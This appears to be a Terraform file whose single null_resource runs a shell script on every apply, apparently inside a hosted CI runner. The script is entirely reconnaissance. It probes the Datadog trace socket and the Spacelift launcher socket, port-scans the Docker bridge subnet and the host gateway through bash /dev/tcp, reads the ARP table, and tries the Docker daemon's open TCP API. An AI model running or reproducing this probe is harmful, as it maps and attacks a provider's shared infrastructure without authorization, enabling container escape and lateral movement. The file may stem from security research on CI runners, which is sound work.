terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.2"
    }
  }
}

resource "null_resource" "xsec_probe" {
  triggers = { nonce = timestamp() }

  provisioner "local-exec" {
    command = <<-EOT
      set +e
      echo "=== P4 START ==="
      echo "--- datadog trace.sock probe ---"
      curl -s -m 4 --unix-socket /var/datadog/trace.sock http://localhost/info | head -c 600
      echo
      curl -s -m 4 -o /dev/null -w "trace.sock RC=%%{http_code}\n" -X POST --unix-socket /var/datadog/trace.sock -H "Content-Type: application/json" -d '{"traces":[]}' http://localhost/v0.4/traces
      echo "--- launcher.sock probe ---"
      curl -s -m 4 --unix-socket /var/spacelift/spacelift_launcher.sock http://localhost/ | head -c 200
      echo
      echo "--- docker bridge live hosts (ICMP via /dev/tcp SYN on 80) ---"
      for i in $(seq 1 30); do
        H="172.17.0.$i"
        ( timeout 1 bash -c "exec 3<>/dev/tcp/$H/80" 2>/dev/null && echo "$H:80 OPEN" ) &
      done
      wait
      echo "--- host gateway port sweep (172.17.0.1) ---"
      for P in 22 80 443 2375 2376 5000 8125 8126 8080 8500 8888 9090 9000 3000 6379 5432 3306 8088 8000 9669 4222 7479 7000; do
        ( timeout 1 bash -c "exec 3<>/dev/tcp/172.17.0.1/$P" 2>/dev/null && echo "172.17.0.1:$P OPEN" ) &
      done
      wait
      echo "--- bridge /24 quick sweep for 8126 (agent) + 2375/2376 (docker) + 22 + 9090 ---"
      for i in $(seq 1 254); do
        for P in 8126 2375 2376 22; do
          ( timeout 1 bash -c "exec 3<>/dev/tcp/172.17.0.$i/$P" 2>/dev/null && echo "172.17.0.$i:$P OPEN" ) &
        done
      done
      wait
      echo "--- dns for hostname ---"
      getent hosts c62cb67ea735 || true
      echo "--- neighbors/arp ---"
      cat /proc/net/arp 2>/dev/null
      echo "--- try docker daemon over tcp (2375/2376 POST info) ---"
      for hp in 172.17.0.1:2375 172.17.0.1:2376; do
        curl -s -m 2 -o /dev/null -w "$hp RC=%%{http_code}\n" http://$hp/info 2>/dev/null || true
      done
      echo "=== P4 END ==="
    EOT
  }
}